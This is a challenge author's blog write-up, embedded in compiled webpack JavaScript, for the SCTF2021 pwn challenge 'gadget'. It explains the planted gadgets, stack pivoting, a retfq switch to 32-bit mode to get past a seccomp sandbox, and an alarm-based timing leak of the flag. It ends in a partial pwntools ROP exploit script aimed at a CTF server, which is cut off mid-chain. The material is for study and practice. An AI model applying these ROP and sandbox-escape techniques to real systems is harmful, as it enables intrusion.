(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{507:function(s,t,a){"use strict";a.r(t);var n=a(31),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"sctf2021-pwn-gadget-出题思路-预期非预期解"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sctf2021-pwn-gadget-出题思路-预期非预期解"}},[s._v("#")]),s._v(" SCTF2021 pwn gadget 出题思路+预期非预期解")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://lingze.xyz/pages/6d05cb/",target:"_blank",rel:"noopener noreferrer"}},[s._v("sctf2021 pwn出题思路"),a("OutboundLink")],1)]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#编译环境"}},[s._v("编译环境")])]),a("li",[a("a",{attrs:{href:"#ora思路"}},[s._v("ora思路")])]),a("li",[a("a",{attrs:{href:"#gadget"}},[s._v("gadget")]),a("ul",[a("li",[a("a",{attrs:{href:"#出题考点"}},[s._v("出题考点")])]),a("li",[a("a",{attrs:{href:"#栈迁移"}},[s._v("栈迁移")])]),a("li",[a("a",{attrs:{href:"#mov-rdx"}},[s._v("mov rdx")])])])]),a("li",[a("a",{attrs:{href:"#时间爆破"}},[s._v("时间爆破")]),a("ul",[a("li",[a("a",{attrs:{href:"#alarm"}},[s._v("alarm")])]),a("li",[a("a",{attrs:{href:"#sub-rcx-esi"}},[s._v("sub [rcx], esi;")])]),a("li",[a("a",{attrs:{href:"#libc-exit-fini"}},[s._v("libcexitfini")])]),a("li",[a("a",{attrs:{href:"#sub-jz-拼凑"}},[s._v("sub+jz 拼凑")])])])]),a("li",[a("a",{attrs:{href:"#exp"}},[s._v("exp")])])])]),a("p"),s._v(" "),a("p",[s._v("出题思路其实来自"),a("a",{attrs:{href:"https://lingze.xyz/pages/ea4dff/",target:"_blank",rel:"noopener noreferrer"}},[s._v("这个题目"),a("OutboundLink")],1),s._v("，非常规的gadget拼凑，")]),s._v(" "),a("h2",{attrs:{id:"编译环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#编译环境"}},[s._v("#")]),s._v(" 编译环境")]),s._v(" "),a("p",[s._v("这个题目的编译环境是ollvm编译出的musl libc， 然后使用这个musl去静态编译出文件来。从而得到的文件中的gadget就很少见了。")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/m4PVCEkhUFo3jOd.png",alt:"image-20211112202707893"}})]),s._v(" "),a("h2",{attrs:{id:"ora思路"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ora思路"}},[s._v("#")]),s._v(" ora思路")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/RpgawNKQUcSYTs6.png",alt:"image-20211112202551950"}})]),s._v(" "),a("p",[s._v("看到沙盒应该就有对应的思路了，先使用retfq跳到32位使用open， 然后回到64位使用read， 最后通过alarm得到flag，")]),s._v(" "),a("p",[s._v("这应该是shellcode题目常见的思路，")]),s._v(" "),a("h2",{attrs:{id:"gadget"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#gadget"}},[s._v("#")]),s._v(" gadget")]),s._v(" "),a("p",[s._v("这里相关的gadget都通过内联汇编或者赋值语句放在程序内了，用ropper查找应该会比ROPgadget效果好一些些。")]),s._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[s._v("    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// pop rcx; retn;")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xc359")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// jmp $ ")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" b "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xfeeb")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// retfq")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xcb48")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// int 80; retn;")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" b "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xc380cd")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("asm")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("volatile")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"movb (%rsi, %rax), %bl\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mov %rbx, %rdi\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"push %r14\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ret\\n\\t"')]),s._v("\n     "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("h3",{attrs:{id:"出题考点"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#出题考点"}},[s._v("#")]),s._v(" 出题考点")]),s._v(" "),a("p",[s._v("其实个人对于gadget的理解是这样的：")]),s._v(" "),a("p",[s._v("一小段代码，它的结构大概是如此: "),a("code",[s._v("[功能][副作用][再次控制]")]),s._v("，")]),s._v(" "),a("p",[s._v("这个功能是我们想要让他运行的代码。")]),s._v(" "),a("p",[s._v("副作用即 我们运行这个gadget必定会向下运行，必须要让他满足的一些指令，或者会干扰我们利用的一些操作也要去处理掉。")]),s._v(" "),a("p",[s._v("再次控制可以是ret， 或者call/jmp某个寄存器，都是ok的，")]),s._v(" "),a("p",[s._v("于是设计题目的时候多次使用了一些很不常规的gadget， 可惜出题有些仓促也没怎么测试题目，导致一些位置没处理好，这几个重要的位置也有挺多非预期，也就直接公布这个题解大伙看看吧。")]),s._v(" "),a("h3",{attrs:{id:"栈迁移"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#栈迁移"}},[s._v("#")]),s._v(" 栈迁移")]),s._v(" "),a("p",[s._v("原本思路是通过leave栈迁移，")]),s._v(" "),a("blockquote",[a("p",[s._v("其实这个第一条完全可用，而且比第一条还短。🧐")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/VAOEFwbgzYXvopI.png",alt:"image-20211112204517189"}})]),s._v(" "),a("p",[s._v("那么这里有一个长度限制，使用"),a("code",[s._v("pop rdi, jmp rax;")]),s._v("会比"),a("code",[s._v("pop rdi; pop rap; ret")]),s._v("少一个字节，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/aK1pwkNObcFLfsM.png",alt:"image-20211112203428200"}})]),s._v(" "),a("p",[s._v("并且在main函数返回的时候已经设置好了这个rax的值")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/wHzkxYv2j3fnL5p.png",alt:"image-20211112203553814"}})]),s._v(" "),a("p",[s._v("看到wp很多师傅通过pop rsp进行栈迁移了，这个在出题的时候确实没有考虑到，这个方案可以更简单一些。")]),s._v(" "),a("h3",{attrs:{id:"mov-rdx"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mov-rdx"}},[s._v("#")]),s._v(" mov rdx")]),s._v(" "),a("p",[s._v("在gadget中其实是没有可用的"),a("code",[s._v("pop rdx")]),s._v("相关的，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/pu7C4XxWrbVJE8g.png",alt:"image-20211112204006171"}})]),s._v(" "),a("blockquote",[a("p",[s._v("这个最后的 "),a("code",[s._v("ret 0xfdbf;")]),s._v("会让栈降低 0xfdbf个大小，不可控")])]),s._v(" "),a("p",[s._v("但是有个这样的gadget路线")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/JtPZqQO8ilGkEMj.png",alt:"image-20211112204105740"}})]),s._v(" "),a("p",[s._v("注意这个 "),a("code",[s._v("mov rdx, r12; call r14;")]),s._v("，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/Oy6nKwGFizVC7R4.png",alt:"image-20211112204114078"}})]),s._v(" "),a("p",[s._v("这两个寄存器我们都可以控制，于是可以借助这个控制rdx，")]),s._v(" "),a("p",[s._v("同时，由于是"),a("code",[s._v("call r14")]),s._v("， 会有返回地址压栈， 于是我们将r14设置到一个随意一个"),a("code",[s._v("pop ;ret")]),s._v("的结构即可。")]),s._v(" "),a("p",[s._v("但是出题仍然没处理好这个位置，主要一开始对于ollvm不太熟，会把这个位置混淆了，于是就吧参数全设置到read内了，后来用了"),a("code",[s._v("__attribute")]),s._v("但是忘了改回来，这样就提供了可以直接跳过来不控制rdx的方案，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/YPoigtFuK8mRfAs.png",alt:"image-20211112210115902"}})]),s._v(" "),a("p",[s._v("而且一直到放题目也没有再注意到这个点，所以这个位置其实出简单了 qaq")]),s._v(" "),a("h2",{attrs:{id:"时间爆破"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#时间爆破"}},[s._v("#")]),s._v(" 时间爆破")]),s._v(" "),a("h3",{attrs:{id:"alarm"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#alarm"}},[s._v("#")]),s._v(" alarm")]),s._v(" "),a("p",[s._v("其实这个位置预期就是ora嘛，使用alarm即可，这里给了个gadget用来取出flag每一位，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/skQcNqREtIgf6vi.png",alt:"image-20211112210737186"}})]),s._v(" "),a("p",[s._v("但是要注意的是，这里是bl, 下面传递是rbx, 需要提前清理掉rbx中的数据，不然还是g，")]),s._v(" "),a("h3",{attrs:{id:"sub-rcx-esi"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sub-rcx-esi"}},[s._v("#")]),s._v(" sub [rcx], esi;")]),s._v(" "),a("p",[s._v("但是nebula的师傅找到了其他gadget， 太猛了！")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/CapqI3MRF5YiHBQ.png",alt:"image-20211112210531054"}})]),s._v(" "),a("blockquote",[a("p",[s._v("这个gadget还是在静态编译的库函数中的，确实猛，")])]),s._v(" "),a("h3",{attrs:{id:"libc-exit-fini"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#libc-exit-fini"}},[s._v("#")]),s._v(" libc_exit_fini")]),s._v(" "),a("p",[s._v("另一个思路是Dest0g3的师傅，这个位置是exit函数中进行数据比较的位置，控制rsp指向我们的flag， 然后这个取值和比较会取到我们的flag，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/jCBYpAXb1FcdyGU.png",alt:"image-20211112211458215"}})]),s._v(" "),a("p",[s._v("这个位置的比较会干扰到整个程序是否退出，于是如果比较成功，那么程序会进入死循环，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/xNOMm47pC13qWZR.png",alt:"image-20220102212151438"}})]),s._v(" "),a("h3",{attrs:{id:"sub-jz-拼凑"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sub-jz-拼凑"}},[s._v("#")]),s._v(" sub+jz 拼凑")]),s._v(" "),a("p",[s._v("r4kpig的师傅们采用了另一套方案拼凑起来sub + jz的跳转，")]),s._v(" "),a("p",[s._v("先运行这个位置比较两个数据，这一步会设置eflag寄存器，下面可以直接使用jz判断是否位0， 即两个数值是否相等，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/pvXBCw8deRPuMo5.png",alt:"image-20220102213510620"}})]),s._v(" "),a("p",[s._v("而后找到一个jz的位置， 两条路不一致，一个跳向rax, 一个直接ret, 于是控制一个为exit一个为"),a("code",[s._v("jmp $")]),s._v("(loop)即可，")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/xid6VtSEcuKzRN5.png",alt:"image-20220102213933015"}})]),s._v(" "),a("h2",{attrs:{id:"exp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[s._v("#")]),s._v(" exp")]),s._v(" "),a("p",[s._v("这里exp是我的思路。")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" \n\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("terminal "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'tmux'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'splitw'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\ncmd "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v("'''\nb * 0x0000000000401222\nb * 0x0000000000408865\nb * 0x00000000004011f3\n'''")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# pop rdi; jmp rax; ")]),s._v("\npoprdi_jmprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402be4")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  pop rdi; pop rbp; ret;")]),s._v("\npoprdi_poprbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401734")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rsi; pop r15; jmp rax;")]),s._v("\npoprsi_1_jmprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402be2")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rsi; pop r15; pop rbp; ret;")]),s._v("\npoprsi_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401732")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : mov rdx, r12; call r14;")]),s._v("\nmovrdx_callr14 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402c07")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop r12; pop r14; pop r15; pop rbp; ret;")]),s._v("\npopr12_popr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000040172f")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rax; ret;")]),s._v("\npoprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401001")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rbp; ret;")]),s._v("\npoprbp_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401102")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : syscall; ret;")]),s._v("\nsyscall_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000408865")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : leave; mov qword ptr [rdi + rdx - 0x2f], rax; mov qword ptr [rdi + rdx - 0x27], rax; mov rax, rdi; ret; ")]),s._v("\nleave "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000403be5")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : leave; mov dword ptr [rbp - 0x40], eax; mov eax, ecx; add rsp, 0x40; pop rbp; ret; ")]),s._v("\nleave2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401224")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : ret; ")]),s._v("\nret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401002")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : int 0x80; ret; ")]),s._v("\nint80 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011f3")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# .text:retfq")]),s._v("\nretfq "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011EC")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0x0000000000402cf5: pop rbx; pop r14; pop r15; pop rbp; ret; ")]),s._v("\npoprbx_popr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000403072")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0x000000000040115b: pop rcx; ret;")]),s._v("\npoprcx "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000040117b")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  mov bl, [rsi+rax];mov rdi, rbx;push r14;retn; ")]),s._v("\nmovrdi "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011BE")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop r14; pop r15; pop rbp; ret;")]),s._v("\npopr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401731")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 000000000040119A: jmp $")]),s._v("\nloop "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011BA")]),s._v("\n\nbss "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000040D160")]),s._v("\nptr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" bss \nfake_rbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" bss\nbuf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" fake_rbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x8")]),s._v("\n\nalarm "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000401150")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("exp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("idx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#cn = process('./gadget')")]),s._v("\n    cn "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"81.69.0.47"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2102")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    payload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'a'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x30")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# read(0, buf, 0x200)")]),s._v("\n            poprdi_jmprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprsi_1_jmprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ptr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            popr12_popr14_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x300")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" poprbp_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            movrdx_callr14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            syscall_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# leave stack->fake_rbp(in bss)")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# poprdi_poprbp, ptr, fake_rbp, ")]),s._v("\n            poprbp_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" fake_rbp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            leave2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    stack "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ptr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    flag_str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'./test\\x00'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ljust"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x40")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'\\x00'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n    to32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            retfq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x23")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n\n    rop32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("  flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# open(flag, 0, 0)")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# eax=5, ebx=flag, ecx=0, edx=0, ")]),s._v("\n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),a("span",{pre:!0,attrs:{class:"token 